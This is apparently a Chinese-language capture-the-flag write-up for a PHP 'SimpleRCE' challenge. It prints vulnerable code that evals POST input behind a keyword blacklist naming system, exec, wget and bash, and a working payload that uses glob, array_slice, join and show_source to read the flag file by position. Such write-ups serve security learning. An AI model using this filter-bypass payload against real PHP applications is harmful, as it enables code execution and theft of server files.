---
date: 2026-10-21
slug: dest0g3-simplerce
categories:
  - 代码执行
---

# [Dest0g3 520迎新赛] SimpleRCE —— 关键词被替换成 hacker 之后

## 源码

```php
$aaa = $_POST['aaa'];
$black_list = array('^','.','`','>','<','=','"','preg','&','|','%0','popen',
'char','decode','html','md5','{','}','post','get','file','ascii','eval',
'replace','assert','exec','$','include','var','pastre','print','tail','sed',
'pcre','flag','scan','decode','system','func','diff','ini_','passthru',
'pcntl','proc_open','+','cat','tac','more','sort','log','current','\\',
'cut','bash','nl','wget','vi','grep');
$aaa = str_ireplace($black_list, "hacker", $aaa);
eval($aaa);
```

## 两个关键判断

```text
① eval()          → 执行的是 PHP 代码,不是 shell 命令
② str_ireplace()  → 命中就【替换成 hacker】,不是拦截
```

**所以 `;ls /` 死路一条 —— `ls /` 不是合法 PHP。**

## 被封的东西

| 被封 | 后果 |
|---|---|
| `$` | 不能用变量 |
| `.` | 不能字符串拼接 |
| `flag` | 变成 `hacker` |
| `system` / `eval` / `assert` / `include` | 常用执行函数全灭 |
| `file` `scan` `glob`… | 部分读文件函数被连坐 |

## 过程

```text
① echo(12);                → 页面出 12,确认 eval 通
② echo(join(glob('/*')));  → 列出根目录,发现 flag
③ 但 flag 会被替换,不能写 '/flag'
④ 用位置:array_slice(glob('/*'),4,1) → ['/flag']
⑤ join 成字符串 → show_source 读出来
```

**最终 payload：**

```php
show_source(join(array_slice(glob('/*'),4,1)));
```

## 每一步在绕什么

| 步骤 | 绕的是 |
|---|---|
| `glob('/*')` | 不知道文件名 |
| `array_slice(...,4,1)` | `flag` 这个词不能出现 |
| `join(...)` | `.` 被禁，不能拼接 |
| `show_source(...)` | `file_get_contents` 含 `file` |

## 踩的坑

!!! bug "echo(12) 没反应"

    **eval 里语句必须带 `;`。**
    普通 PHP 文件里 `?>` 能代替分号，eval 没有 `?>`。

    ```text
    Parse error: syntax error, unexpected end of file, expecting ';'
    ```

!!! bug "echo(glob('/*')) 只输出 Array"

    echo 不能输出数组，要先 `join()`。

!!! bug "show_source('/f*') 失败"

    show_source 不做通配符展开 —— 它去找一个名字字面量叫 `f*` 的文件。

## 收获

> **关键词被替换 ≠ 无解 —— 用「运行时拼接」把词造出来。**
>
> **名字被过滤 ≠ 无解 —— 用「位置」代替「名字」。**
>
> **先分清 eval 还是 system，否则整个方向都是错的。**
